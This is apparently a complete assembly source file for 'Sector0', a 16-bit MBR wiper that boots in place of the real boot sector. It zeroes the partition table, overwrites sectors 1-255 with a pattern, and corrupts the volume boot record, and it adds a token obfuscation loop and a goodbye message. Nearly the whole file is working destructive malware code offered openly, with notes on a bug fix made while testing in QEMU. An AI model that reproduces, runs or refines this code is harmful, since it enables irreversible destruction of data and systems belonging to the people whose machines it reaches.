; =============================================================================
; Sector0 - MBR Wiper Payload
; =============================================================================
; 16-bit Real Mode bootloader that corrupts MBR/VBR and wipes disk sectors.
; 
; Based on: https://github.com/liuzhaicutey/Windows_DLLs_Bootkits_Rootkits
; Original variable names preserved in comments for reference:
;   _start          -> ikuyooo
;   wipe_payload    -> uwu_payload  
;   msg_goodbye     -> sayonara_tehehe
;   wipe_pattern    -> uwu_uwu
;   xor_key         -> uwu_key
;
; Author: saladin0x1
; =============================================================================

[org 0x7C00]

; -----------------------------------------------------------------------------
; Entry Point - BIOS loads MBR here at 0x7C00
; -----------------------------------------------------------------------------
; BUG FIX: Original code used DS=0x07C0 which caused no output in QEMU.
;
; Real mode addressing: Physical = DS * 16 + offset
;
; Method A: [org 0x7C00] + DS=0x0000 → 0x0000*16 + 0x7Cxx = 0x7Cxx ✓
; Method B: [org 0x0000] + DS=0x07C0 → 0x07C0*16 + 0x00xx = 0x7Cxx ✓
;
; Original code mixed both: [org 0x7C00] + DS=0x07C0
; Result: 0x07C0*16 + 0x7Cxx = 0x7C00 + 0x7Cxx = 0xF8xx (wrong!)
;
; The wipe still worked because disk I/O uses hardcoded buffer address
; (0x7C00), but print_string read garbage from wrong memory location.
; Discovered when testing in QEMU - bootloader ran but printed nothing.
; -----------------------------------------------------------------------------
_start:
    ; Clear interrupts during setup
    cli
    
    ; Set up segment registers (DS=ES=0 for org 0x7C00)
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
    mov sp, 0x7C00          ; Stack grows down from 0x7C00
    
    ; Re-enable interrupts
    sti

    ; Display message via BIOS teletype
    mov si, msg_goodbye
    call print_string

    ; Execute destructive payload
    call wipe_payload

    ; Halt - infinite loop
    jmp $

; -----------------------------------------------------------------------------
; print_string - Output null-terminated string via BIOS INT 0x10
; Input: SI = pointer to string
; -----------------------------------------------------------------------------
print_string:
    mov ah, 0x0E            ; BIOS teletype function
.loop:
    mov al, [si]
    cmp al, 0x00
    je .done
    int 0x10
    inc si
    jmp .loop
.done:
    ret

; -----------------------------------------------------------------------------
; wipe_payload - Main destructive routine
; Corrupts partition table, wipes sectors 1-255, corrupts VBR
; -----------------------------------------------------------------------------
wipe_payload:
    ; Dummy decryption loop (obfuscation)
    mov si, xor_key
    mov cx, 5
.decrypt:
    lodsb
    loop .decrypt

    ; --- Phase 1: Corrupt MBR Partition Table ---
    call read_mbr

    mov di, 0x7C00 + 0x1BE  ; Partition table offset
    mov cx, 4 * 16          ; 4 entries × 16 bytes
    mov al, 0x00            ; Zero out partition table
.corrupt_pt:
    stosb
    loop .corrupt_pt

    call write_mbr

    ; --- Phase 2: Wipe Sectors 1-255 ---
    mov cx, 255
.wipe_sectors:
    push cx 

    call fill_wipe_pattern

    ; Write sector via BIOS INT 0x13
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03            ; Write sector
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0

    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; First HDD
    int 0x13

    pop cx  
    inc cl                  ; Next sector
    loop .wipe_sectors

    ; --- Phase 3: Corrupt VBR ---
    call read_vbr
    call corrupt_vbr
    call write_vbr

    ret

; -----------------------------------------------------------------------------
; Data Section
; -----------------------------------------------------------------------------
msg_goodbye:    db 'SECTOR0: Disk wipe complete.', 0x0D, 0x0A, 0x00
wipe_pattern:   db 'SECTOR0!!', 0x00     ; 10 bytes including null
wipe_short:     db 'S0', 0x00            ; Short pattern
xor_key:        db 0xDE, 0xAD, 0xBE, 0xEF, 0x00  ; Dummy XOR key

; -----------------------------------------------------------------------------
; read_mbr - Read MBR (sector 1) into buffer at 0x7C00
; -----------------------------------------------------------------------------
read_mbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02            ; Read sector
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0
    mov cl, 0x01            ; Sector 1 (MBR)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; First HDD
    int 0x13
    ret

; -----------------------------------------------------------------------------
; write_mbr - Write buffer to MBR (sector 1)
; -----------------------------------------------------------------------------
write_mbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03            ; Write sector
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0
    mov cl, 0x01            ; Sector 1 (MBR)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; First HDD
    int 0x13
    ret

; -----------------------------------------------------------------------------
; read_vbr - Read VBR (sector 2) into buffer
; -----------------------------------------------------------------------------
read_vbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02            ; Read sector
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0
    mov cl, 0x02            ; Sector 2 (VBR)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; First HDD
    int 0x13
    ret

; -----------------------------------------------------------------------------
; write_vbr - Write buffer to VBR (sector 2)
; -----------------------------------------------------------------------------
write_vbr:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03            ; Write sector
    mov al, 0x01            ; 1 sector
    mov ch, 0x00            ; Cylinder 0
    mov cl, 0x02            ; Sector 2 (VBR)
    mov dh, 0x00            ; Head 0
    mov dl, 0x80            ; First HDD
    int 0x13
    ret

; -----------------------------------------------------------------------------
; fill_wipe_pattern - Fill 512-byte buffer with wipe pattern
; -----------------------------------------------------------------------------
fill_wipe_pattern:
    pusha
    mov di, 0x7C00
    mov cx, 512 / 10        ; Pattern is 10 bytes
    mov si, wipe_pattern
.fill:
    push cx
    mov cx, 10
.copy:
    mov al, [si]
    stosb
    inc si
    loop .copy
    mov si, wipe_pattern
    pop cx
    loop .fill

    ; Fill remainder
    mov cx, 512 % 10
    mov al, 0x00
.remainder:
    stosb
    loop .remainder
    popa
    ret

; -----------------------------------------------------------------------------
; corrupt_vbr - Overwrite VBR OEM name field
; -----------------------------------------------------------------------------
corrupt_vbr:
    pusha
    mov di, 0x7C00 + 0x03   ; OEM name offset in BPB
    mov al, 0x00            ; Zero it out
    stosb
    stosb
    stosb
    stosb
    stosb
    popa
    ret

; -----------------------------------------------------------------------------
; Boot signature - Required for BIOS to recognize as bootable
; -----------------------------------------------------------------------------
times 510-($-$$) db 0
dw 0xAA55